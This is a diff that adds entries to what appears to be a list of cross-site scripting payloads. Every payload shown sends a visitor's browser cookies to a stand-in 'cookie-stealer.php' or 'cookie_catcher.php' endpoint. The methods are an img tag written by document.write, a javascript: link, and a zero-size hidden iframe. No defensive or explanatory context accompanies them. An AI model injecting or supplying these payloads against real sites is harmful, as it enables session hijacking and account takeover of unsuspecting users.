@@ -7,3 +7,17 @@ new Image().src="http://www.example.com/cookie_catcher.php?cookie="+encodeURI(do
 </script>
 
 <a href="javascript:document.location='http://www.example.com/cookie_catcher.php?cookie='+document.cookie;">Click here!</a>
+
+<script>
+document.write("<img src=http://www.examplesdfdf.com/cookie-stealer.php?cookie="+ document.cookie+">");
+</script>
+
+<script>
+document.write("<img src=http://example.com/cookie-stealer.php?cookie="+ escape(document.cookie) + ">");  
+</script>
+
+
+<iframe frameborder=1 src="" height=0 width=0 id="XSS" name="XSS" > </iframe>
+<script>
+frames["XSS"].location.href="http://example.com/cookie-stealer.php?cookie=" + document.cookie;
+</script>
